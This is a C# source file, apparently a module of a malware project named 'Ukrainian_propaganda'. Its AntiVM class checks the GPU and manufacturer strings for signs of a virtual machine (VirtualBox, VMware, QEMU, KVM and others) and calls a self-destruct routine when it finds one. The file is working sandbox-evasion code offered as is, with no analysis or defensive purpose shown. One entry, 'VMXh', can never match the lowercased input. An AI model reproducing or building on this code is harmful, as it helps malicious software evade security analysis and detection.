using System;
using System.IO;
using System.Reflection;
using static Ukrainian_propaganda.SystemInfo;
using static Ukrainian_propaganda.SelfDestruct;

namespace Ukrainian_propaganda
{
    class AntiVM
    {
        private static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;
        private static readonly string TempPath = Path.GetTempPath();
        
        public static void IsVirtualMachine()
        {
            string gpu = GetGPUName().ToLower();
            string manufacturer = GetComputerManufacturer().ToLower();
            string[] vm_names = new string[]
            {
                "vbox",
                "vmbox",
                "vmware",
                "virtualbox",
                "qemu",
                "thinapp",
                "VMXh",
                "innotek gmbh",
                "tpvcgateway",
                "tpautoconnsvc",
                "kvm",
                "red hat",
                "virtual platform"
            };

            foreach (string name in vm_names)
            {
                if (gpu.Contains(name) || manufacturer.Contains(name))
                {
                    Terminate();
                }
            }
        }
    }
}
